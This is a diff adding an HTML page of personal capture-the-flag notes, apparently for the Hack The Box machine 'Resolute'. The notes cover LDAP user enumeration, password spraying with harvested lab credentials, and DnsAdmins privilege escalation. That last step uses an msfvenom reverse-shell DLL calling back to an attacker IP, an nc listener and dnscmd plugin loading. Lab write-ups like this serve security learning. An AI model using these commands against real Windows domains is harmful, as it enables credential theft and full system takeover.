@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>10.10.10.169 Resolute2</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>10.10.10.169 Resolute2</h1><br/>nmap showed an assload of ports open.<br />dns showed megabank.local and ldap showed resolute.megabank.local. Both were added to /etc/hosts<br /><br />ldapsearch dumped me a great userlist<br />ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; | grep -i sam | grep -v 8 | awk &#39;{print $2}&#39; &gt; users.txt<br /><br />enum4linux got me a password for mark novak<br />novak:Welcome123!<br /><br />nothing with novak would let me login<br /><br />I used the smbloop to see if the password worked for another user...<br />Score!<br />melanie:Welcome123!<br />evil-winrm in... user!<br /><br />after cheating...<br />dir -force on C:\ shows you a wierd dir. Follow it and you get creds for the other user ryan.<br />C:\pstranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt<br />ryan<br />Serv3r4Admin4cc123!<br />evil-winrm in as ryan<br /><br />whoami /groups showed me that I was part of dnsadmins (Prepare to be rooted!)<br />msfvenom to make a malicious .dll<br />msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f dll &gt; yee.dll<br />smbserver.py yeet `pwd`<br />nc -nlvp 3232<br /><br />net view \\10.10.14.60<br />dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.60\yeet\yee.dll<br />sc.exe stop dns<br />sc.exe start dns<br />rooted!<br /></div></body></html>
